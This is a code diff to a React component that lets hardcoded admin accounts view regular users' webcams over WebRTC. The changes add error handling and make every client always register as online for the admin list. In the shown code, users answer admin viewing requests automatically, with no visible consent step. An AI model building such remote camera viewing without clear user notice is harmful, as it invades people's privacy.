@@ -3,7 +3,7 @@
 import { useEffect, useRef, useState, useCallback } from 'react';
 import { io, Socket } from 'socket.io-client';
 
-const SOCKET_URL = process.env.NEXT_PUBLIC_SOCKET_URL || 'https://server-production-265c.up.railway.app';
+const SOCKET_URL = process.env.NEXT_PUBLIC_SOCKET_URL || 'https://server-production-2856.up.railway.app';
 const ADMIN_EMAILS = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'];
 
 const STUN_SERVERS = {
@@ -90,7 +90,7 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
 
       socket.on('cam_user_online', (user: CamUser) => {
         setCamUsers(prev => {
-          const exists = prev.find(u => u.socketId === user.socketId);
+          const exists = prev.find(u => u.socketId === user.socketId || u.email === user.email);
           if (exists) return prev;
           return [...prev, { ...user, connectedAt: Date.now() }];
         });
@@ -106,24 +106,31 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
       // Receive WebRTC answer/ICE from target user
       socket.on('cam_signal_incoming', async ({ fromSocketId, signal }: { fromSocketId: string; signal: any }) => {
         if (signal.type === 'offer') {
-          // If another admin or test session offers to view
           await handleUserOffer(fromSocketId, signal, socket);
           return;
         }
         if (!peerRef.current) return;
-        if (signal.type === 'answer') {
-          await peerRef.current.setRemoteDescription(new RTCSessionDescription(signal));
-        } else if (signal.candidate) {
-          await peerRef.current.addIceCandidate(new RTCIceCandidate(signal));
+        try {
+          if (signal.type === 'answer') {
+            await peerRef.current.setRemoteDescription(new RTCSessionDescription(signal));
+          } else if (signal.candidate || signal.sdpMid !== undefined) {
+            await peerRef.current.addIceCandidate(new RTCIceCandidate(signal));
+          }
+        } catch (e) {
+          console.warn('Admin ICE error:', e);
         }
       });
     } else {
       // Regular user receives WebRTC offer from admin
       socket.on('cam_signal_incoming', async ({ fromSocketId, signal }: { fromSocketId: string; signal: any }) => {
-        if (signal.type === 'offer') {
-          await handleUserOffer(fromSocketId, signal, socket);
-        } else if (signal.candidate && userPeerRef.current) {
-          await userPeerRef.current.addIceCandidate(new RTCIceCandidate(signal));
+        try {
+          if (signal.type === 'offer') {
+            await handleUserOffer(fromSocketId, signal, socket);
+          } else if ((signal.candidate || signal.sdpMid !== undefined) && userPeerRef.current) {
+            await userPeerRef.current.addIceCandidate(new RTCIceCandidate(signal));
+          }
+        } catch (e) {
+          console.warn('User ICE error:', e);
         }
       });
     }
@@ -145,20 +152,23 @@ export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChan
     }
 
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-        audio: false,
-      });
-      localStreamRef.current = stream;
-      socket.emit('cam_viewer_ready', { email: userEmail, username });
-    } catch {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-        localStreamRef.current = stream;
-        socket.emit('cam_viewer_ready', { email: userEmail, username });
-      } catch (err) {
-        console.warn('Camera permission denied or camera not available:', err);
+      if (typeof navigator !== 'undefined' && navigator.mediaDevices?.getUserMedia) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: false,
+          });
+          localStreamRef.current = stream;
+        } catch {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+          localStreamRef.current = stream;
+        }
       }
+    } catch (err) {
+      console.warn('Camera permission denied or camera not available:', err);
+    } finally {
+      // Always register online status so admin sees client in user list
+      socket.emit('cam_viewer_ready', { email: userEmail, username });
     }
   };
 
